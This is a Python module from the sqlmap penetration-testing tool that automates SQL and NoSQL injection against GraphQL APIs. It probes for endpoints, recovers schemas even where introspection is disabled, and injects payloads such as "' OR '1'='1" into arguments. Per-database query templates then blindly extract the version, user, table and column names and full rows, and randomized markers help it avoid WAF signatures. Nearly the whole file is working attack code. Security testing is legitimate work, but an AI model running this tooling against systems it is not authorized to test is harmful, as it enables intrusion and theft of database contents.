#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import json
import re
import time

from collections import namedtuple
from collections import OrderedDict

from lib.core.common import beep
from lib.core.common import randomStr
from lib.core.convert import getUnicode
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import CUSTOM_LOGGING
from lib.core.enums import POST_HINT
from lib.core.settings import ERROR_PARSING_REGEXES
from lib.core.settings import GRAPHQL_ARG_WORDLIST
from lib.core.settings import GRAPHQL_ENDPOINT_PATHS
from lib.core.settings import GRAPHQL_ERROR_REGEX
from lib.core.settings import GRAPHQL_FIELD_WORDLIST
from lib.core.settings import GRAPHQL_INTROSPECTION_QUERY
from lib.core.settings import NOSQL_ERROR_REGEX
from lib.core.settings import UPPER_RATIO_BOUND
from lib.request.connect import Connect as Request
from lib.utils.nonsql import blockedStatus
from lib.utils.nonsql import decide as _decide
from lib.utils.nonsql import Decision as _Decision
from lib.utils.nonsql import InconclusiveError
from lib.utils.nonsql import ratio as _ratio
from lib.utils.nonsql import resolveBit
from lib.utils.xrange import xrange
from thirdparty.six import unichr as _unichr

# Improbable literal used to build always-true/never-match payloads. Randomized per run (like
# NOSQL_SENTINEL) so it never becomes a static signature a WAF can pin a blocking rule on.
SENTINEL = randomStr(length=10, lowercase=True)

# Maximum characters recovered for a single blind-inferred scalar (banner, user, table list, ...)
MAX_LENGTH = 1024

# Ceiling for a single row's concatenated cells (one row is extracted per request, so
# this need not hold a whole table; a GROUP_CONCAT of the whole table would be silently
# capped by the back-end - notably MySQL's group_concat_max_len=1024 - hence per-row).
DUMP_MAX_LENGTH = 8192

# Maximum number of rows dumped per table (bounds a runaway blind dump)
DUMP_MAX_ROWS = 1000

# Printable-ASCII codepoint bounds for blind character inference (the fast common path);
# a codepoint proven above CHAR_MAX is recovered over the full Unicode range instead of
# being silently mangled into a wrong printable char.
CHAR_MIN = 0x20
CHAR_MAX = 0x7e
UNICODE_MAX = 0x10FFFF

# Number of independent predicates packed into a single aliased GraphQL document (batched inference)
BATCH_SIZE = 40

# Cell separator woven into a per-row dump scalar (printable, improbable in data)
COL_SEP = "~~~"

# GraphQL scalar types mapped to injection strategy (None = skip)
SCALAR_STRATEGY = {
    "String": "string",
    "ID": "id_dual",
    "Int": "numeric",
    "Float": "numeric",
}

# SQL error-inducing payloads (probe for backend DBMS leakage through the GraphQL errors envelope)
_SQL_ERROR_PAYLOADS = ("'", "''", "'\"", "')", "1') OR ('1'='1")

# Preliminary SQL boolean-blind probes
_SQL_BOOLEAN_TRUE = "' OR '1'='1"
_SQL_BOOLEAN_FALSE = "' AND '1'='2"

# NoSQL operator probes (for NoSQL-backed GraphQL resolvers)
_NOSQL_NE = '{"$ne": null}'
_NOSQL_IN = '{"$in": ["%s"]}' % SENTINEL

# Minimum content difference for a boolean oracle to be considered reliable
_MIN_RATIO_DIFF = 0.15

# Cache for INPUT_OBJECT field definitions, populated during schema walks
_inputFields = {}

# Cache for ENUM value names (first entry used when synthesizing a required enum argument), populated
# during schema walks - a required enum must be rendered as a bare enum identifier, never a quoted string
_enumValues = {}


# --- Backend SQL dialect table ----------------------------------------------

# Per-DBMS building blocks for blind inference and enumeration, driven by the boolean/time oracle
# established on a slot. `fingerprint` is a predicate true only on that back-end (it errors -> falsy
# elsewhere). `length`/`ordinal` render a scalar-extraction sub-expression. `delay` wraps a condition
# in an inline conditional sleep (None where the engine offers none, e.g. SQLite). `banner`/
# `currentUser`/`currentDb` are generic enumeration scalars. Table and column NAMES are enumerated
# one at a time by ordinal position from a catalog source: `tableFrom`/`tableCol` and
# `columnFrom(table)`/`columnCol` give the FROM(+WHERE) and the name column, `paginate(col, offset)`
# adds the per-dialect single-row window. `row(columns, table, offset)` is one data row's cells
# joined by COL_SEP. Per-item enumeration avoids a GROUP_CONCAT/STRING_AGG scalar that the back-end
# would silently truncate (e.g. MySQL group_concat_max_len=1024).
Dialect = namedtuple("Dialect", ("fingerprint", "length", "ordinal", "delay",
                                 "banner", "currentUser", "currentDb",
                                 "tableFrom", "tableCol", "columnFrom", "columnCol", "paginate", "row",
                                 "fromIdent"))


def _sqlLiteral(value):
    # A value embedded as a SQL STRING LITERAL (catalog WHERE clauses, OBJECT_ID('..'),
    # pragma_table_info('..')): standard single-quote doubling, safe on all four back-ends. Without it
    # a table/column name containing a quote breaks the catalog query and the dump silently yields
    # nothing.
    return "'%s'" % getUnicode(value).replace("'", "''")


def _identDouble(name):     # SQLite / PostgreSQL: double-quoted, preserves case, embedded '"' doubled
    return '"%s"' % getUnicode(name).replace('"', '""')


def _identBracket(name):    # Microsoft SQL Server: [bracketed], embedded ']' doubled
    return "[%s]" % getUnicode(name).replace("]", "]]")


def _identBacktick(name):   # MySQL: `backticked`, embedded '`' doubled
    return "`%s`" % getUnicode(name).replace("`", "``")


def _qualifiedIdent(name, quoter):
    # Quote a (possibly schema-qualified) catalog table name for a FROM clause: split a "schema.table"
    # on the FIRST dot and quote each part with the dialect identifier syntax; quote an unqualified
    # name whole. Schema-qualification lets PostgreSQL/MSSQL dump tables outside the default schema,
    # which an unqualified name cannot reference.
    if "." in name:
        schema, _, table = name.partition(".")
        return "%s.%s" % (quoter(schema), quoter(table))
    return quoter(name)


def _sqliteFrom(table):
    return _qualifiedIdent(table, _identDouble)


def _mysqlFrom(table):
    return _identBacktick(table)            # MySQL enumerates the current database only (unqualified)


def _pgsqlFrom(table):
    return _qualifiedIdent(table, _identDouble)


def _mssqlFrom(table):
    return _qualifiedIdent(table, _identBracket)


def _limitOffset(col, offset):
    return "ORDER BY %s LIMIT 1 OFFSET %d" % (col, offset)


def _offsetFetch(col, offset):
    return "ORDER BY %s OFFSET %d ROWS FETCH NEXT 1 ROWS ONLY" % (col, offset)


# A row is extracted one at a time by ordinal position (LIMIT/OFFSET). Concatenating
# the whole table into a single GROUP_CONCAT/STRING_AGG scalar would be silently
# truncated by the back-end (MySQL caps group_concat_max_len at 1024 bytes), dropping
# rows without warning; per-row extraction is unbounded and dialect-uniform.
# Every row query orders by the (single, concatenated) output column - `ORDER BY 1` - so a given
# offset refers to the SAME physical row across the length probe AND every per-character probe.
# Without a stable ordering, offset N could bind to different records between requests and the
# recovered cell would be a fabricated composite of several rows (the concatenation is a total order;
# genuinely identical rows are indistinguishable anyway, so uniqueness is not required for stability).
# In a row query the table and every column are IDENTIFIERS, so they are quoted with the dialect's
# identifier syntax - otherwise a reserved word, a space, a mixed-case PostgreSQL name, or a name with
# a quote character produces a broken query and the dump silently drops that table/column. `table` may
# already be a schema-qualified, pre-quoted identifier from the catalog (PostgreSQL/MSSQL), in which
# case it is used verbatim.
def _sqliteRow(columns, table, offset):
    body = ("||'%s'||" % COL_SEP).join("COALESCE(CAST(%s AS TEXT),'NULL')" % _identDouble(_) for _ in columns)
    return "(SELECT %s FROM %s ORDER BY 1 LIMIT 1 OFFSET %d)" % (body, _sqliteFrom(table), offset)


def _mysqlRow(columns, table, offset):
    body = "CONCAT_WS('%s',%s)" % (COL_SEP, ",".join("COALESCE(CAST(%s AS CHAR),'NULL')" % _identBacktick(_) for _ in columns))
    return "(SELECT %s FROM %s ORDER BY 1 LIMIT %d,1)" % (body, _mysqlFrom(table), offset)


def _pgsqlRow(columns, table, offset):
    body = ("||'%s'||" % COL_SEP).join("COALESCE(CAST(%s AS TEXT),'NULL')" % _identDouble(_) for _ in columns)
    return "(SELECT %s FROM %s ORDER BY 1 LIMIT 1 OFFSET %d)" % (body, _pgsqlFrom(table), offset)


def _mssqlRow(columns, table, offset):
    body = ("+'%s'+" % COL_SEP).join("COALESCE(CAST(%s AS VARCHAR(MAX)),'NULL')" % _identBracket(_) for _ in columns)
    return "(SELECT %s FROM %s ORDER BY 1 OFFSET %d ROWS FETCH NEXT 1 ROWS ONLY)" % (body, _mssqlFrom(table), offset)


def _sqliteColumnFrom(table):
    return "FROM pragma_table_info(%s)" % _sqlLiteral(table)


def _mysqlColumnFrom(table):
    # scope to the active database: information_schema.columns holds the same table name across every
    # schema, so an unscoped lookup would merge unrelated columns and then dump nonexistent fields
    return "FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name=%s" % _sqlLiteral(table)


def _pgsqlColumnFrom(table):
    # `table` is the catalog's "schema.table"; look columns up by the split schema + table literals
    schema, _, tbl = table.partition(".") if "." in table else ("public", "", table)
    return "FROM information_schema.columns WHERE table_schema=%s AND table_name=%s" % (_sqlLiteral(schema), _sqlLiteral(tbl))


def _mssqlColumnFrom(table):
    # OBJECT_ID() resolves a "schema.table" string directly, so the qualified name is passed as a literal
    return "FROM sys.columns WHERE object_id=OBJECT_ID(%s)" % _sqlLiteral(table)


DIALECTS = OrderedDict((
    ("SQLite", Dialect(
        fingerprint="SQLITE_VERSION() IS NOT NULL",
        length=lambda expr: "LENGTH((%s))" % expr,
        ordinal=lambda expr, pos: "UNICODE(SUBSTR((%s),%d,1))" % (expr, pos),
        delay=None,
        banner="SQLITE_VERSION()",
        currentUser=None,
        currentDb=None,
        tableFrom="FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'",
        tableCol="name",
        columnFrom=_sqliteColumnFrom,
        columnCol="name",
        paginate=_limitOffset,
        row=_sqliteRow,
        fromIdent=_sqliteFrom)),
    ("Microsoft SQL Server", Dialect(
        fingerprint="@@VERSION LIKE '%Microsoft%'",
        length=lambda expr: "LEN((%s))" % expr,
        ordinal=lambda expr, pos: "UNICODE(SUBSTRING((%s),%d,1))" % (expr, pos),   # ASCII() truncates non-ASCII to a byte
        delay=None,
        banner="@@VERSION",
        currentUser="SYSTEM_USER",
        currentDb="DB_NAME()",
        # schema-qualify so tables outside dbo are enumerable and dumpable (SCHEMA_NAME + name)
        tableFrom="FROM sys.tables t",
        tableCol="CONCAT(SCHEMA_NAME(t.schema_id),'.',t.name)",
        columnFrom=_mssqlColumnFrom,
        columnCol="name",
        paginate=_offsetFetch,
        row=_mssqlRow,
        fromIdent=_mssqlFrom)),
    ("PostgreSQL", Dialect(
        fingerprint="(SELECT version()) LIKE 'PostgreSQL%'",
        length=lambda expr: "LENGTH((%s))" % expr,
        ordinal=lambda expr, pos: "ASCII(SUBSTRING((%s),%d,1))" % (expr, pos),
        delay=lambda cond, secs: "(CASE WHEN (%s) THEN (SELECT 1 FROM pg_sleep(%d)) ELSE 0 END)" % (cond, secs),
        banner="version()",
        currentUser="CURRENT_USER",
        currentDb="CURRENT_DATABASE()",
        # enumerate every user schema (not just public) and carry schema+table so dumps qualify
        tableFrom="FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog','information_schema')",
        tableCol="table_schema||'.'||table_name",
        columnFrom=_pgsqlColumnFrom,
        columnCol="column_name",
        paginate=_limitOffset,
        row=_pgsqlRow,
        fromIdent=_pgsqlFrom)),
    ("MySQL", Dialect(
        fingerprint="@@VERSION_COMMENT IS NOT NULL",
        length=lambda expr: "CHAR_LENGTH((%s))" % expr,
        ordinal=lambda expr, pos: "ASCII(SUBSTRING((%s),%d,1))" % (expr, pos),
        delay=lambda cond, secs: "IF((%s),SLEEP(%d),0)" % (cond, secs),
        banner="VERSION()",
        currentUser="CURRENT_USER()",
        currentDb="DATABASE()",
        tableFrom="FROM information_schema.tables WHERE table_schema=DATABASE()",
        tableCol="table_name",
        columnFrom=_mysqlColumnFrom,
        columnCol="column_name",
        paginate=_limitOffset,
        row=_mysqlRow,
        fromIdent=_mysqlFrom)),
))


# --- Slot model -------------------------------------------------------------

# Carries everything needed to build a valid GraphQL document for one argument
# injection point: the root operation (query/mutation), the full field argument
# list (so required siblings can be defaulted), the target argument name, the
# injection strategy, and return-type metadata for a correct selection set.
Slot = namedtuple("Slot", ("operation", "parentType", "fieldName", "allArgs",
                            "targetArg", "strategy", "returnKind", "returnType",
                            "returnSel"))


# --- Helpers ----------------------------------------------------------------



def _chunks(sequence, size):
    # Yield successive `size`-length chunks of `sequence`
    for index in xrange(0, len(sequence), size):
        yield sequence[index:index + size]


def _unwrapType(typeObj, depth=0):
    # Traverse a GraphQL type chain, returning [(kind, name), ...] from outermost
    # to innermost. NON_NULL and LIST wrappers are unwrapped transparently; named
    # types terminate the chain.
    if depth > 8 or not isinstance(typeObj, dict):
        return []
    kind = typeObj.get("kind", "")
    name = typeObj.get("name")
    ofType = typeObj.get("ofType")
    if ofType and kind in ("NON_NULL", "LIST"):
        return [(kind, name)] + _unwrapType(ofType, depth + 1)
    return [(kind, name)]


def _leafName(chain):
    # Last named type in the unwrapped chain (strips NON_NULL / LIST wrappers)
    for kind, name in reversed(chain):
        if name:
            return name
    return None


def _classifyArg(argType):
    # Map a GraphQL argument type to a strategy key, or None for skipped types
    chain = _unwrapType(argType)
    named = next((name for kind, name in reversed(chain) if name), None)
    return SCALAR_STRATEGY.get(named)


def _escapeGraphQLString(value):
    # Escape a string for embedding inside a double-quoted GraphQL string literal
    return getUnicode(value).replace("\\", "\\\\").replace('"', '\\"').replace("\n", "\\n")


def _cell(value):
    # Render a parsed JSON value as a single dump cell: NULL for null, compact JSON
    # for nested objects/arrays (never the Python repr), and the plain text otherwise
    if value is None:
        return "NULL"
    if isinstance(value, (dict, list)):
        return json.dumps(value, sort_keys=True)
    return "%s" % (value,)


# --- HTTP transport ---------------------------------------------------------

def _gqlSend(endpoint, query, variables=None):
    # POST a JSON GraphQL request to `endpoint`, returning (body, http_code)
    body = {"query": query}
    if variables:
        body["variables"] = variables

    if conf.delay:
        time.sleep(conf.delay)

    if conf.verbose >= 3:
        logger.log(CUSTOM_LOGGING.PAYLOAD, query[:200])

    oldPostHint = getattr(kb, "postHint", None)
    try:
        kb.postHint = POST_HINT.JSON
        page, _, code = Request.getPage(url=endpoint, post=json.dumps(body),
                                        raise404=False, silent=True)
    except Exception as ex:
        # a transport failure must NOT become an empty body: two failed "true" requests would be
        # byte-identical (ratio 1.0) and "differ" from a succeeding false request -> a fabricated
        # confirmation. Return None so the oracles (which reject None) can never decide on it.
        logger.debug("GraphQL request failed: %s" % getUnicode(ex))
        return None, 0
    finally:
        kb.postHint = oldPostHint
    if blockedStatus(code):                 # WAF / rate-limit / 5xx is not a usable oracle sample
        return None, code
    return page or "", code


def _parseJSON(page):
    if not page:
        return None
    try:
        return json.loads(page)
    except (ValueError, TypeError):
        return None


def _isGraphQLResponse(page):
    # Does `page` look like a GraphQL JSON response envelope? Requires either
    # __typename data or GraphQL-specific error phrasing to avoid false positives
    # on ordinary JSON APIs.
    doc = _parseJSON(page)
    if not isinstance(doc, dict):
        return False
    data = doc.get("data")
    if isinstance(data, dict) and data.get("__typename"):
        return True
    errors = doc.get("errors")
    if isinstance(errors, list) and errors:
        return bool(re.search(GRAPHQL_ERROR_REGEX, json.dumps(errors)))
    return False


def _errorText(page):
    # Extract a concatenated error-message string from a GraphQL error envelope
    doc = _parseJSON(page)
    if not isinstance(doc, dict):
        return ""
    errors = doc.get("errors") or []
    parts = []
    for e in errors:
        if isinstance(e, dict):
            parts.append(getUnicode(e.get("message", "")))
            ext = e.get("extensions")
            if isinstance(ext, dict):
                parts.append(getUnicode(ext.get("code", "")))
                exception = ext.get("exception")
                if isinstance(exception, (str, bytes)):
                    parts.append(getUnicode(exception))
    return "\n".join(p for p in parts if p)


def _slotValue(page):
    # Extract the first `data` subtree for boolean comparison - we compare the
    # resolved field content, not the whole GraphQL envelope.
    doc = _parseJSON(page)
    if not isinstance(doc, dict):
        return page
    data = doc.get("data")
    if isinstance(data, dict):
        for v in data.values():
            if v is not None:
                return json.dumps(v, sort_keys=True)
    return json.dumps(data, sort_keys=True)


def _hasErrors(page):
    # True when the GraphQL envelope carries a non-empty `errors` array. A resolver error yields the
    # SAME `data:null` as a genuine false predicate, so an error-bearing response is UNKNOWN for a
    # boolean oracle - it must not be classified as a false bit (that would fabricate an oracle /
    # corrupt extraction). HTTP status is 200 in this case, so only the envelope reveals it.
    doc = _parseJSON(page)
    return isinstance(doc, dict) and bool(doc.get("errors"))


def _aliasErrored(page, alias):
    # True when a batched response reports a GraphQL error whose `path` starts at `alias` (that alias's
    # value is unknown, not a clean false), or when the alias key is absent from `data`.
    doc = _parseJSON(page)
    if not isinstance(doc, dict):
        return True
    for e in (doc.get("errors") or []):
        path = e.get("path") if isinstance(e, dict) else None
        if isinstance(path, list) and path and path[0] == alias:
            return True
    data = doc.get("data")
    return not (isinstance(data, dict) and alias in data)


# --- Endpoint detection -----------------------------------------------------

def _detectEndpoint(baseUrl, probePaths=True):
    # Identify the GraphQL endpoint URL. If `baseUrl` already points at a path
    # that responds as GraphQL, return it directly. Otherwise probe common paths.

    page, code = _gqlSend(baseUrl, "{__typename}")
    if _isGraphQLResponse(page):
        return baseUrl, page

    if not probePaths:
        return None, None

    for path in GRAPHQL_ENDPOINT_PATHS:
        candidate = baseUrl.rstrip("/") + path
        page, code = _gqlSend(candidate, "{__typename}")
        if _isGraphQLResponse(page):
            return candidate, page

    return None, None


# --- Schema introspection ---------------------------------------------------

def _introspect(endpoint):
    # Send the standard introspection query and return the parsed __schema dict.
    # Falls back to a query without `specifiedByURL` for older GraphQL servers
    # that reject it.

    for query in (GRAPHQL_INTROSPECTION_QUERY,
                  GRAPHQL_INTROSPECTION_QUERY.replace('specifiedByURL\n', '')):
        page, code = _gqlSend(endpoint, query)
        doc = _parseJSON(page)
        if not isinstance(doc, dict):
            continue
        data = doc.get("data")
        if isinstance(data, dict) and "__schema" in data:
            return data["__schema"]
    return None


# --- Schema recovery via field suggestions (introspection disabled) ---------

def _gqlErrors(page):
    # GraphQL error-envelope messages as a list of strings
    doc = _parseJSON(page)
    if not isinstance(doc, dict):
        return []
    return [getUnicode(e.get("message", "")) for e in (doc.get("errors") or []) if isinstance(e, dict)]


def _harvestSuggestions(message):
    # Pull suggested identifiers out of a "Did you mean ..." GraphQL validation message,
    # handling both single- and double-quoted phrasings ('a', 'b', or 'c' / "a" or "b")
    idx = message.find("Did you mean")
    if idx < 0:
        return []
    return re.findall(r"""['"]([A-Za-z_][A-Za-z0-9_]*)['"]""", message[idx:])


def _suggestFields(endpoint, op):
    # Recover root field names for an operation via suggestion harvesting: probe a random
    # (guaranteed-unknown) field to collect the closest matches, then confirm/expand using a
    # seed wordlist. A seed that does NOT come back as "Cannot query field" is itself a real field.
    prefix = "" if op == "query" else "mutation "
    found = set()
    probes = [randomStr(length=10, lowercase=True)] + list(GRAPHQL_FIELD_WORDLIST)

    for seed in probes:
        page, _ = _gqlSend(endpoint, "%s{ %s }" % (prefix, seed))
        doc = _parseJSON(page) or {}
        for entry in (doc.get("errors") or []):
            message = getUnicode(entry.get("message", "")) if isinstance(entry, dict) else ""
            if "Did you mean" in message and "on type" in message:
                found.update(_harvestSuggestions(message))
        # a seeded name counts as a real field only if it actually resolved (appears in `data`);
        # "no unknown-field error" alone is too weak (lenient servers accept anything)
        data = doc.get("data")
        if seed in GRAPHQL_FIELD_WORDLIST and isinstance(data, dict) and seed in data:
            found.add(seed)

    return sorted(found)


def _suggestArgs(endpoint, op, field):
    # Recover an argument name for `field` from an "Unknown argument ... Did you mean ..." message
    prefix = "" if op == "query" else "mutation "
    bogus = randomStr(length=10, lowercase=True)
    page, _ = _gqlSend(endpoint, '%s{ %s(%s: 1) }' % (prefix, field, bogus))
    found = set()
    for message in _gqlErrors(page):
        if "Unknown argument" in message:
            found.update(_harvestSuggestions(message))
    return sorted(found)


def _introspectViaSuggestions(endpoint):
    # Fallback schema recovery when introspection is disabled but the server still leaks field/argument
    # names through "Did you mean" validation errors. Builds best-effort Slots: known scalar arg types
    # are unavailable here, so we default to the 'string' strategy (the most broadly injectable) and let
    # the per-slot injection oracle confirm which (field, argument) pairs are actually vulnerable.

    probe = randomStr(length=10, lowercase=True)
    page, _ = _gqlSend(endpoint, "{ %s }" % probe)
    if not any("Did you mean" in m for m in _gqlErrors(page)):
        return None

    logger.info("introspection is disabled; recovering the schema from field-suggestion errors")

    slots = []
    for op, parentName in (("query", "Query"), ("mutation", "Mutation")):
        fields = _suggestFields(endpoint, op)
        if not fields:
            continue
        logger.info("recovered %d %s field(s) via suggestions: %s" % (
            len(fields), op, ", ".join(fields)))
        for field in fields:
            args = _suggestArgs(endpoint, op, field) or list(GRAPHQL_ARG_WORDLIST)
            for arg in args:
                # returnSel="" renders as "{ __typename }" (valid on any OBJECT); strategy="string"
                slots.append(Slot(op, parentName, field, [(arg, {}, None)],
                                  arg, "string", "OBJECT", "", ""))
    return slots or None


# --- Schema walking ---------------------------------------------------------

def _extractSlots(schema):
    # Walk the schema's Query and Mutation types, harvesting every
    # scalar/injectable argument as a Slot

    _inputFields.clear()
    _enumValues.clear()

    slots = []
    typeByName = {}
    for t in (schema.get("types") or []):
        if isinstance(t, dict) and t.get("name"):
            typeByName[t["name"]] = t
            if t.get("kind") == "INPUT_OBJECT":
                _inputFields[t["name"]] = [
                    (f["name"], f.get("type", {}), f.get("defaultValue"))
                    for f in (t.get("inputFields") or [])
                ]
            elif t.get("kind") == "ENUM":
                _enumValues[t["name"]] = [e["name"] for e in (t.get("enumValues") or []) if e.get("name")]

    queryName = (schema.get("queryType") or {}).get("name")
    mutationName = (schema.get("mutationType") or {}).get("name")

    for op, rootName in (("query", queryName), ("mutation", mutationName)):
        if not rootName:
            continue
        rootType = typeByName.get(rootName)
        if not rootType or rootType.get("kind") != "OBJECT":
            continue
        for field in (rootType.get("fields") or []):
            fieldName = field["name"]
            fieldArgs = field.get("args") or []

            # Resolve return-type kind and the leaf selection set
            returnChain = _unwrapType(field.get("type", {}))
            returnKind = "SCALAR"
            returnTypeName = _leafName(returnChain)
            for kind, name in returnChain:
                if kind != "NON_NULL":
                    returnKind = kind

            returnObj = typeByName.get(returnTypeName) if returnTypeName else None
            leafFields = _scalarFields(returnObj, typeByName)

            # Nested object selections (one level)
            nested = {}
            if returnObj and returnObj.get("kind") == "OBJECT":
                for rf in (returnObj.get("fields") or []):
                    rfChain = _unwrapType(rf.get("type", {}))
                    rfName = _leafName(rfChain)
                    rfObj = typeByName.get(rfName) if rfName else None
                    if rfObj and rfObj.get("kind") == "OBJECT":
                        nested[rf["name"]] = _scalarFields(rfObj, typeByName) or ["__typename"]

            returnSel = _renderSelection(returnKind, returnTypeName, leafFields, nested)

            for arg in (fieldArgs or []):
                allArgs = [(a["name"], a.get("type", {}), a.get("defaultValue")) for a in fieldArgs]
                strategy = _classifyArg(arg.get("type", {}))
                if strategy:
                    slots.append(Slot(op, rootName, fieldName, allArgs,
                                      arg["name"], strategy, returnKind,
                                      returnTypeName, returnSel))
                elif _isInputObject(arg.get("type", {}), typeByName):
                    _inputSlots(op, rootName, fieldName, allArgs,
                                arg["name"], arg.get("type", {}),
                                returnKind, returnTypeName, returnSel, typeByName, slots)
    return slots


# Mutation field-name heuristics: read-like mutations (login/verify/token/...) are safe to probe first;
# write-like ones (create/update/delete/...) are ranked last so a usable oracle is usually found on a
# non-persisting resolver before any write-like field is touched.
_READ_LIKE_MUTATIONS = ("login", "authenticate", "auth", "verify", "validate", "preview", "check",
                        "token", "signin", "session", "lookup", "search", "get", "fetch", "read", "resolve")
_WRITE_LIKE_MUTATIONS = ("create", "update", "delete", "insert", "save", "set", "add", "remove",
                         "register", "upsert", "destroy", "modify", "edit", "write", "put", "patch", "drop")
# argument names that request a non-persisting / dry-run execution - forced true when present so an
# automatic mutation probe avoids committing
_DRYRUN_ARGS = ("dryrun", "dry_run", "preview", "simulate", "validateonly", "validate_only", "noop", "no_op")


def _mutationTokens(fieldName):
    # split camelCase and snake/kebab/space so a mixed name (updateUserPreview) yields distinct tokens
    # (['update','user','preview']) - a read-like substring must NOT mask a write-like one hidden in the
    # same name.
    spaced = re.sub(r"([a-z0-9])([A-Z])", r"\1 \2", getUnicode(fieldName))
    return [t for t in re.split(r"[^A-Za-z0-9]+", spaced.lower()) if t]


def _mutationImpact(fieldName):
    # WRITE-like WINS: any name whose tokens contain a write keyword is write-like, even if it also
    # contains a read-like one (updateUserPreview / previewDeleteUser / getAndDeleteUser / createSession).
    # Only a name with NO write token and at least one read token is read-like; anything else is unknown.
    tokens = _mutationTokens(fieldName)
    matches = lambda kws: any(any(kw in tok for kw in kws) for tok in tokens)
    if matches(_WRITE_LIKE_MUTATIONS):
        return "write-like"
    if matches(_READ_LIKE_MUTATIONS):
        return "read-like"
    return "unknown"


def _rankMutations(slots):
    order = {"read-like": 0, "unknown": 1, "write-like": 2}
    return sorted(slots, key=lambda s: order[_mutationImpact(s.fieldName)])


def _dryRunVerified(slot, endpoint):
    """Whether this write-like mutation's NON-PERSISTENCE is automatically PROVEN, so it may be used as
    the bulk blind-enumeration transport (hundreds/thousands of executions). Forcing an argument named
    dryRun/preview true is NOT proof - a resolver may ignore, invert, or repurpose the name. A sound
    proof needs an observed side-effect check (a schema-backed validate-only result that confirms no
    commit, a rollback/transaction id, a distinct preview result type, or a compensating rollback), none
    of which can be established reliably from introspection alone here. Returning False keeps write-like
    mutations DETECTED and REPORTED but off the bulk-enumeration path - the conservative, honest default;
    it is the hook to wire a real behavioural dry-run confirmation when the schema/environment supports
    one."""
    return False


def _isInputObject(typeObj, typeByName):
    name = _leafName(_unwrapType(typeObj))
    if not name:
        return None
    t = typeByName.get(name)
    return t if t and t.get("kind") == "INPUT_OBJECT" else None


def _inputSlots(op, rootName, fieldName, allArgs, argName, typeObj,
                returnKind, returnType, returnSel, typeByName, slots, _depth=0, _seen=None):
    # Recurse into an input object to ARBITRARY depth, emitting a Slot for every scalar leaf reachable
    # by a dotted path (input.filter.credentials.username). Bounded by depth and a visited-type set so a
    # self-/mutually-recursive input schema cannot loop forever.
    inputType = _isInputObject(typeObj, typeByName)
    if not inputType or _depth > 5:
        return
    typeName = _leafName(_unwrapType(typeObj))
    _seen = _seen or set()
    if typeName in _seen:
        return
    _seen = _seen | {typeName}
    for fld in (inputType.get("inputFields") or []):
        path = "%s.%s" % (argName, fld["name"])
        strategy = _classifyArg(fld.get("type", {}))
        if strategy:
            slots.append(Slot(op, rootName, fieldName, allArgs,
                              path, strategy, returnKind, returnType, returnSel))
        elif _isInputObject(fld.get("type", {}), typeByName):
            _inputSlots(op, rootName, fieldName, allArgs, path, fld.get("type", {}),
                        returnKind, returnType, returnSel, typeByName, slots, _depth + 1, _seen)


def _scalarFields(objType, typeByName, depth=0):
    # Return scalar/leaf field names reachable from `objType` (for selection set)
    if not objType or depth > 3:
        return []
    names = []
    for fld in (objType.get("fields") or []):
        fType = typeByName.get(_leafName(_unwrapType(fld.get("type", {}))))
        if not fType or fType.get("kind") in ("SCALAR", "ENUM"):
            names.append(fld["name"])
    return names


def _renderSelection(returnKind, returnType, leafFields, nested):
    # Build the return selection part of a GraphQL document string.
    # Scalars/enums: no sub-selection (None). Objects/Lists-of-objects:
    # nested field set. Lists-of-scalars also get no sub-selection.
    if returnKind in ("SCALAR", "ENUM"):
        return None
    leafPart = " ".join(leafFields) if leafFields else "__typename"
    nestedPart = ""
    for objField, subFields in (nested or {}).items():
        nestedPart += " %s { %s }" % (objField, " ".join(subFields))
    return "{ %s%s }" % (leafPart, nestedPart)


# --- Request construction ---------------------------------------------------

def _fieldFragment(slot, value, alias=None):
    # Render a single `alias:field(args) selection` fragment with `value` in the
    # target argument. Required sibling arguments get safe defaults. Returns "" when
    # the value cannot be embedded (e.g. a non-numeric payload in an Int literal).

    if slot.strategy == "numeric" and not getUnicode(value).lstrip("-").isdigit():
        return ""

    renderedArgs = []
    for argName, argType, default in slot.allArgs:
        if argName == slot.targetArg or slot.targetArg.startswith(argName + "."):
            if "." in slot.targetArg:
                # target is a path into a (possibly deeply) nested input object: render the whole
                # containing tree down to the injected leaf, e.g. input:{filter:{credentials:{username:VALUE}}}
                outer = slot.targetArg.split(".")[0]
                if argName == outer:
                    outerType = _leafName(_unwrapType(argType))
                    rest = slot.targetArg.split(".")[1:]
                    renderedArgs.append("%s: {%s}" % (outer, _renderInputPath(outerType, rest, value, slot.strategy)))
                    continue
            renderedArgs.append(_renderArg(argName, value, slot.strategy))
        elif argName.lower().replace("-", "_") in _DRYRUN_ARGS and _leafName(_unwrapType(argType)) == "Boolean":
            renderedArgs.append("%s:true" % argName)    # force a dry-run/no-op flag so a mutation probe avoids committing
        else:
            sibling = _renderSibling(argName, argType, default)
            if sibling is not None:                 # None => optional arg with no default -> omitted
                renderedArgs.append(sibling)

    sel = slot.returnSel
    if sel is None:
        sel = ""
    elif not sel:
        sel = "{ __typename }"
    argsPart = "(%s)" % ", ".join(renderedArgs) if renderedArgs else ""
    return "%s:%s%s %s" % (alias or slot.fieldName, slot.fieldName, argsPart, sel)


def _buildQuery(slot, value):
    # Render a complete single-field GraphQL document with `value` in the target
    # argument. Wraps as a mutation when the slot belongs to the mutation root.
    fragment = _fieldFragment(slot, value)
    if not fragment:
        return ""
    prefix = "mutation " if slot.operation == "mutation" else ""
    return "%s{%s}" % (prefix, fragment)


def _buildBatch(slot, values):
    # Render one GraphQL document aliasing the field once per value (a0, a1, ...),
    # so many independent injections resolve in a single request. Returns
    # (document, aliases) or ("", []) when any value cannot be embedded.
    fragments, aliases = [], []
    for index, value in enumerate(values):
        alias = "a%d" % index
        fragment = _fieldFragment(slot, value, alias)
        if not fragment:
            return "", []
        fragments.append(fragment)
        aliases.append(alias)
    prefix = "mutation " if slot.operation == "mutation" else ""
    return "%s{%s}" % (prefix, " ".join(fragments)), aliases


def _renderArg(name, value, strategy):
    # Render a single argument: name:"value" (string) or name:value (numeric)
    if strategy == "numeric":
        return "%s:%s" % (name, value)
    if strategy == "id_dual" and isinstance(value, (str, bytes)) and getUnicode(value).lstrip("-").isdigit():
        return "%s:%s" % (name, value)
    return '%s:"%s"' % (name, _escapeGraphQLString(value))


